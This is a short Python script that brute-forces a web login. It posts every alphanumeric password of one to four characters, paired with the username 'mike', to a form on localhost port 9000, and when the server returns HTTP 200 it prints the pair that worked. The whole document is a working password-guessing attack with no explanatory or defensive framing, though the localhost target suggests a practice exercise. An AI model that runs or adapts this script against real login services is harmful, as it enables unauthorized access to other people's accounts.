from string import digits, ascii_uppercase, ascii_lowercase, punctuation
from itertools import product
import requests


def attemptLogin(username, password):
    r = requests.post("http://localhost:9000", data={"username": username, "password": password})
    response = r.text
    code = r.status_code

    if(code != 200):
        print("Failed login attempt")
        print(response)
        return False
    else:
        print(response)
        print("Username was " + username + " and password was " + password)
        return True


def gen_possible_strings_without_punctuation(minLength, maxLength):
    possibleChars = digits + ascii_uppercase + ascii_lowercase
    charsList = list(possibleChars)

    result = []

    for n in range(minLength, maxLength + 1):
        for comb in product(charsList, repeat=n):
            result.append(''.join(comb))

    return result


def main():
    username = "mike";
    possiblePasswords = gen_possible_strings_without_punctuation(1, 4)
    for password in possiblePasswords:
        didPass = attemptLogin(username, password)
        if(didPass):
            break

main();
